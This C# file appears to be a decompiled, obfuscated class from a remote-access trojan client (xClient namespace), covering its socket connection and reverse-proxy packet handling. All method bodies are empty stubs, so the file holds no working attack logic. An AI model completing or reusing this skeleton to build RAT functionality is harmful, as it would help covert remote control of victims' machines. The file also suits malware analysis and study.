using System;
using System.Collections.Generic;
using System.Net;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using dg3ypDAonQcOidMs0w;
using xClient.Core.NetSerializer;
using xClient.Core.ReverseProxy.Packets;

public class GClass33
{
	public delegate void GDelegate3(GClass33 s, Exception ex);

	public delegate void GDelegate4(GClass33 s, bool connected);

	public delegate void GDelegate5(GClass33 s, GInterface4 packet);

	public delegate void GDelegate6(GClass33 s, GInterface4 packet, long length, byte[] rawData);

	public enum GEnum8
	{
		const_0,
		const_1
	}

	[CompilerGenerated]
	private sealed class Class27
	{
		public int int_0;

		internal static Class27 GuqtOwFfGIQIJP6d395;

		internal bool method_0(GClass1 t)
		{
			return true;
		}

		static Class27()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			S4lYZcFPm3XZKyhCiE3();
		}

		internal static void vnyxCxFCHGW68Fuhiu5()
		{
		}

		internal static bool yWdb3DFKXSVBMqZRayI()
		{
			return true;
		}

		internal static Class27 oG8TldFhY0LUqQH5CQk()
		{
			return null;
		}

		internal static int OiGKa1F0DECwXkjMRIt(object object_0)
		{
			return 0;
		}

		internal static void S4lYZcFPm3XZKyhCiE3()
		{
		}
	}

	[CompilerGenerated]
	private GDelegate3 gdelegate3_0;

	[CompilerGenerated]
	private GDelegate4 gdelegate4_0;

	[CompilerGenerated]
	private GDelegate5 gdelegate5_0;

	[CompilerGenerated]
	private GDelegate6 gdelegate6_0;

	private Socket socket_0;

	private List<GClass1> list_0;

	private readonly object object_0;

	private byte[] byte_0;

	private byte[] byte_1;

	private readonly Queue<byte[]> queue_0;

	private bool bool_0;

	private readonly object object_1;

	private readonly Queue<byte[]> queue_1;

	private bool bool_1;

	private readonly object object_2;

	private byte[] byte_2;

	private bool bool_2;

	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private GEnum8 genum8_0;

	[CompilerGenerated]
	private bool bool_3;

	[CompilerGenerated]
	private Serializer serializer_0;

	internal static GClass33 PsAmx6FeAGwg9uxFw02;

	public int BUFFER_SIZE => 0;

	public uint KEEP_ALIVE_TIME => 0u;

	public uint KEEP_ALIVE_INTERVAL => 0u;

	public int HEADER_SIZE => 0;

	public int MAX_PACKET_SIZE => 0;

	public GClass1[] ProxyClients => null;

	public bool Connected
	{
		[CompilerGenerated]
		get
		{
			return true;
		}
		[CompilerGenerated]
		private set
		{
		}
	}

	protected Serializer Serializer
	{
		[CompilerGenerated]
		get
		{
			return null;
		}
		[CompilerGenerated]
		set
		{
		}
	}

	public event GDelegate3 Event_0
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate4 Event_1
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate5 Event_2
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	public event GDelegate6 Event_3
	{
		[CompilerGenerated]
		add
		{
		}
		[CompilerGenerated]
		remove
		{
		}
	}

	private void method_0(Exception ex)
	{
	}

	private void method_1(bool connected)
	{
	}

	private void method_2(GInterface4 packet)
	{
	}

	private void method_3(GInterface4 packet, long length, byte[] rawData)
	{
	}

	protected GClass33()
	{
	}

	protected void method_4(IPAddress ip, ushort port)
	{
	}

	private void method_5(IAsyncResult result)
	{
	}

	private void method_6(object state)
	{
	}

	public void method_7<T>(T packet) where T : GInterface4
	{
	}

	public void method_8<T>(T packet) where T : GInterface4
	{
	}

	private void method_9(object state)
	{
	}

	private byte[] method_10(byte[] payload)
	{
		return null;
	}

	private void method_11(bool clear = false)
	{
	}

	public void method_12()
	{
	}

	public void method_13(ReverseProxyConnect command)
	{
	}

	public GClass1 method_14(int connectionId)
	{
		return null;
	}

	public void method_15(int connectionId)
	{
	}

	static GClass33()
	{
		WP6RZJql8gZrNhVA9v.prXoP4RuYp();
		qNakx2FuJ6gr9UhJ5Yt();
	}

	internal static bool kqgojHFOXFfDl1GugLM()
	{
		return true;
	}

	internal static GClass33 rhcfAbFWI4regfGTyue()
	{
		return null;
	}

	internal static object ber9fRFVQkfyIJ7bM51(object object_3, object object_4)
	{
		return null;
	}

	internal static void FiG13LF2w5pstestt7n(object object_3, object object_4, object object_5)
	{
	}

	internal static object XoN6v5FxoJAcfxXNFCM(object object_3, object object_4)
	{
		return null;
	}

	internal static void ot3VhXFa8pbQL30fOuT(object object_3, object object_4, bool connected)
	{
	}

	internal static void AZ90p8F4Nt5kVgEAIiN(object object_3, object object_4, object object_5)
	{
	}

	internal static void cAHc4AFbKC40nAjvCnP(object object_3, object object_4, object object_5, long length, object object_6)
	{
	}

	internal static object fTkdUpFEKiXWmytPQvW(object object_3)
	{
		return null;
	}

	internal static void XZ24CCFBIr1av1f173i(object object_3)
	{
	}

	internal static void bxLxN5FTYlepHql7sho()
	{
	}

	internal static AddressFamily QFm9NpFZxhA0gLXWtBj(object object_3)
	{
		return (AddressFamily)(object)null;
	}

	internal static bool hcygVhFgMWvX33fp1OO(object object_3)
	{
		return true;
	}

	internal static object lYoa53FF1ZW8HcGtLHZ(object object_3, object object_4, int int_5, int int_6, SocketFlags socketFlags_0, object object_5, object object_6)
	{
		return null;
	}

	internal static int TrOuoMFUpxGP4GbTAVd(object object_3, object object_4)
	{
		return 0;
	}

	internal static object kN4d9sFmwtvFtg4eVLU(int int_5)
	{
		return null;
	}

	internal static void XsKfX7F3B3yAn2OVDeo(object object_3, object object_4, int int_5)
	{
	}

	internal static bool f4j6LpFcXD6BT2w2auw(object object_3)
	{
		return true;
	}

	internal static void VG9NR2Fsn0LIlETddU4(object object_3, int int_5, object object_4, int int_6, int int_7)
	{
	}

	internal static int A2WAX6FJpBVLbH9enHX(object object_3, int int_5)
	{
		return 0;
	}

	internal static object SkgvmkFGJi2UaZrBb0u(object object_3)
	{
		return null;
	}

	internal static object LbdQcXF70aHmfj5xyr9(object object_3)
	{
		return null;
	}

	internal static object ovJSUrFYdq1py1GxySZ(object object_3, object object_4)
	{
		return null;
	}

	internal static int hCfkgsFw14LrdkfSToe(object object_3)
	{
		return 0;
	}

	internal static int sgIFeeF8QNEKZyyigCO(object object_3, object object_4)
	{
		return 0;
	}

	internal static object qfNqVKF6QF5efQn6k6d(object object_3)
	{
		return null;
	}

	internal static void i0UngLFnRMtTrmUud5v(object object_3)
	{
	}

	internal static void fuNEMkFDBJ3GJ6Do3IK(object object_3)
	{
	}

	internal static void iumxJKFjSKrgvLVMtjS(object object_3)
	{
	}

	internal static int GOa8mnFNlnMsG4dbo5r(object object_3)
	{
		return 0;
	}

	internal static void tPCtlPFvexx8w5iSBVN(object object_3, int int_5)
	{
	}

	internal static void qNakx2FuJ6gr9UhJ5Yt()
	{
	}
}
